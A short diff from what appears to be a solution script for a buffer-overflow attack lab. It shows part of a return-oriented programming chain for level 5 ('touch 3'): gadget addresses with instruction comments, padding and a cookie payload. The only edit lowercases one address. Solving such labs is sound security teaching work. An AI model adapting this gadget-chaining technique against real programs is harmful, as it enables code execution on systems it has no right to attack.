@@ -120,7 +120,7 @@ def solve_level_5(flag: bool) -> None:
         + p64(0x401a49) # mov esi, ecx; or dl, dl; ret
         + p64(0x4019c6) # lea rax, [rdi + rsi]; ret
         + p64(0x401992) # mov rdi, rax; ret
-        + p64(0x4018FC) # touch 3
+        + p64(0x4018fc) # touch 3
         + b"a" * (0x100 - 0x40 - 8) # padding (offset - prev_stack_size - self)
         + payload # cookie hex string
     )
